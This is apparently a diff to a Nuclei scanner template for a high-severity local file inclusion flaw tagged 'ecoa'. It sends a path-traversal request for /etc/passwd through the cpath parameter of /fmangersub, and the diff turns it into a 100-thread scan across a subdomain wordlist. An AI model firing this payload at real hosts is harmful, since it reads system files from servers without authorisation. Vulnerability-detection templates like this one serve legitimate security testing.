@@ -9,14 +9,18 @@ info:
   severity: high
   tags: ecoa,lfi
 requests:
-- matchers:
+- attack: sniper
+  matchers:
   - part: body
     regex:
     - 'root:.*:0:0:'
     type: regex
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
   raw:
   - 'GET /fmangersub?cpath=../../../../../../../etc/passwd HTTP/1.1
 
-    Host: {{Hostname}}
+    Host: {{Subdomains}}
 
     '
+  threads: 100
